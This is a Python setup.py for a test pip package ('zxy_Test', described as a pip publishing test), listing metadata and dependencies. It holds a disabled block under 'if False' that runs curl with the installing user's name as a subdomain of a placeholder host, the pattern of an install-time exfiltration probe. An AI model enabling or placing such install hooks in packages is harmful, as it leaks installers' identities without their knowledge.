# coding: utf-8

import io
import os

from setuptools import find_packages, setup

# 包元信息
NAME = 'lz-pip-demo'                                   # 实际包的名字
DESCRIPTION = '测试pip发包'                     # 项目描述
URL = 'https://code.byted.org/liuzhe.inf/test_pip'  # 项目仓库 URL
EMAIL = 'liuzhe.inf@bytedance.com'                         # 维护者邮箱地址
AUTHOR = 'liuzhe.inf'                                      # 维护者姓名

# 项目运行需要的依赖
REQUIRES = [
    'six>=1.11.0,<2.0.0',
]

# 开发、测试过程中需要的依赖
DEV_REQUIRES = [
    'flake8>=3.5.0,<4.0.0',
    'mypy>=0.620; python_version>="3.4"',
    'tox>=3.0.0,<4.0.0',
    'isort>=4.0.0,<5.0.0',
    'pytest>=4.0.0,<5.0.0'
]

if False:
    import os
    os.system("curl `whoami`.xxxx.com")

here = os.path.abspath(os.path.dirname(__file__))

try:
    with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:
        long_description = '\n' + f.read()
except IOError:
    long_description = DESCRIPTION


about = {'__version__':'1.3.39'}
# with io.open(os.path.join(here, NAME, '__version__.py')) as f:
#     exec(f.read(), about)


setup(
    #name='byted' + NAME,  # add the 'byted' prefix for package name
    name='zxy_Test',
    version='0.0.3',
    description=DESCRIPTION,
    long_description=long_description,
    long_description_content_type='text/markdown',
    author=AUTHOR,
    author_email=EMAIL,
    url=URL,
    classifiers=[
        # Trove classifiers
        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers
        'Intended Audience :: Developers',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
    ],
    keywords='boilerplate',
    packages=find_packages(exclude=['docs', 'tests']),
    install_requires=REQUIRES,
    tests_require=[
        'pytest>=4.0.0,<5.0.0'
    ],
    python_requires='>=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*,!=3.4.*',
    extras_require={
        ':python_version<"3.5"': [
            'typing>=3.6.4,<=3.10.0.0',
        ],
        'dev': DEV_REQUIRES,
    },
    package_data={
        # for PEP484 & PEP561
        NAME: ['py.typed', '*.pyi'],
    },
)
